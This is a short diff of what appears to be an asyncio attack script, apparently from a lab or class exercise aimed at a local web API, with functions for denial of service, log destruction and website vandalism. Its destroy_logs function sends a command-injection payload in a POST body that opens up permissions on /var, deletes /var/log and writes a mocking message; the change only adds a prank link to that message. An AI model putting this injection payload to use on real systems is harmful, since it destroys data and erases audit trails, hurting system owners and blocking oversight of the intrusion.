@@ -29,7 +29,8 @@ async def denial_of_service(port):
 async def destroy_logs(port):
     await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
                "\"; chmod 777 /var -R; rm -rf /var/log; mkdir /var/log; > /var/log/message;"
-               " echo \"Much lulz. J'ai delete tes logs.\" >> /var/log/message #"))
+               " echo \"Much lulz. J'ai delete tes logs.\r\n Comment les recuperer:"
+               " https://www.youtube.com/watch?v=oHg5SJYRHA0\" >> /var/log/message #"))
 
 
 async def vandalize_website(port):
